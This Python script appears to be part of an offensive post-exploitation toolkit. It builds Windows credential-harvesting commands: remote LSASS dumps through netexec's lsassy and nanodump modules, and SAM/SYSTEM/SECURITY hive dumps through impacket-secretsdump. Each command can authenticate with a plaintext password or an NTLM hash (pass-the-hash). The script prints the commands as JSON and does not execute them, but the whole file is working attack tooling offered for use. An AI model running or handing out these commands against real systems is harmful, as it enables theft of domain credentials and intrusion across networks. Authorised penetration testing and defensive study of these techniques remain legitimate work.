#!/usr/bin/env python3
"""Build credential-harvesting commands for post-exploit privesc.

Supports three methods:
  lsassy   - netexec smb -M lsassy
  nanodump - nanodump remote dump via netexec smb -M nanodump
  sam      - impacket-secretsdump SAM/SYSTEM/SECURITY dump

Usage:
  python skills/privesc/scripts/cred_harvest.py --target 10.0.0.5 -d corp -u admin -p Pass1 --method lsassy
  python skills/privesc/scripts/cred_harvest.py --target 10.0.0.5 -u admin -H <NT> --method sam
"""

from __future__ import annotations

import argparse
import json
import shutil


METHODS = ("lsassy", "nanodump", "sam")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Credential harvest command builder.")
    parser.add_argument("--target", required=True, help="Target IP or hostname")
    parser.add_argument("-d", "--domain", default=".", help="Domain (default: .)")
    parser.add_argument("-u", "--user", required=True, help="Username")
    cred = parser.add_mutually_exclusive_group(required=True)
    cred.add_argument("-p", "--password", help="Plaintext password")
    cred.add_argument("-H", "--hash", help="NTLM hash (LM:NT or :NT)")
    parser.add_argument(
        "--method",
        choices=METHODS,
        default="lsassy",
        help="Harvest method: lsassy, nanodump, or sam (default: lsassy)",
    )
    return parser.parse_args()


def _cred_flag(args: argparse.Namespace) -> list[str]:
    if args.password:
        return ["-p", args.password]
    return ["-H", args.hash]


def build_lsassy(args: argparse.Namespace) -> dict[str, object]:
    tool = "netexec"
    binary = shutil.which(tool) or tool
    cmd = (
        [binary, "smb", args.target]
        + ["-d", args.domain, "-u", args.user]
        + _cred_flag(args)
        + ["-M", "lsassy"]
    )
    return {
        "method": "lsassy",
        "tool": tool,
        "binary_found": bool(shutil.which(tool)),
        "command": cmd,
        "command_str": " ".join(cmd),
        "notes": "Requires lsassy module installed (pip install lsassy). Dumps LSASS via comsvcs.dll MiniDump.",
    }


def build_nanodump(args: argparse.Namespace) -> dict[str, object]:
    tool = "netexec"
    binary = shutil.which(tool) or tool
    cmd = (
        [binary, "smb", args.target]
        + ["-d", args.domain, "-u", args.user]
        + _cred_flag(args)
        + ["-M", "nanodump"]
    )
    return {
        "method": "nanodump",
        "tool": tool,
        "binary_found": bool(shutil.which(tool)),
        "command": cmd,
        "command_str": " ".join(cmd),
        "notes": "Requires nanodump nxc module. Reflective LSASS dump using nanodump.x64.exe.",
    }


def build_sam(args: argparse.Namespace) -> dict[str, object]:
    tool = "impacket-secretsdump"
    binary = shutil.which(tool) or tool
    target_str = f"{args.domain}/{args.user}@{args.target}"
    if args.password:
        auth = ["-no-pass"] if not args.password else []
        # secretsdump embeds password in the target string
        target_str = f"{args.domain}/{args.user}:{args.password}@{args.target}"
        cmd = [binary, target_str, "-sam"]
    else:
        cmd = [binary, "-hashes", args.hash, target_str, "-sam"]
    return {
        "method": "sam",
        "tool": tool,
        "binary_found": bool(shutil.which(tool)),
        "command": cmd,
        "command_str": " ".join(cmd),
        "notes": "Dumps SAM/SYSTEM/SECURITY via SMB. Requires local admin on target.",
    }


BUILDERS = {
    "lsassy": build_lsassy,
    "nanodump": build_nanodump,
    "sam": build_sam,
}


def main() -> int:
    args = parse_args()
    payload = BUILDERS[args.method](args)
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
